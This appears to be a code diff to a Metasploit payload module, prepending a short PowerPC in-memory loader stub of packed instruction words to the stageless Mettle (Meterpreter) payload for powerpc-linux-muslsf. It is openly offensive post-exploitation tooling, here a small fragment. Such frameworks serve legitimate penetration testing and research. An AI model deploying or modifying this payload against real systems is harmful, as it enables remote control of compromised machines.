@@ -36,6 +36,14 @@ module MetasploitModule
       scheme: 'tcp',
       stageless: true
     }.merge(mettle_logging_config)
-    MetasploitPayloads::Mettle.new('powerpc-linux-muslsf', generate_config(opts)).to_binary :exec
+    in_memory_loader = [
+      0x7c832b78, # 0x1000:	or	r3, r4, r5	0x7c832b78
+      0x7c832b78, # 0x1004:	or	r3, r4, r5	0x7c832b78
+      0x7c832b78, # 0x1008:	or	r3, r4, r5	0x7c832b78
+      0x48000004, # 0x100c:	b	0x1010	0x48000004
+      0x7de802a6, # 0x1010:	mflr	r15	0x7de802a6
+    ].pack('V*')
+    payload = MetasploitPayloads::Mettle.new('powerpc-linux-muslsf', generate_config(opts)).to_binary :exec
+    in_memory_loader + payload
   end
 end
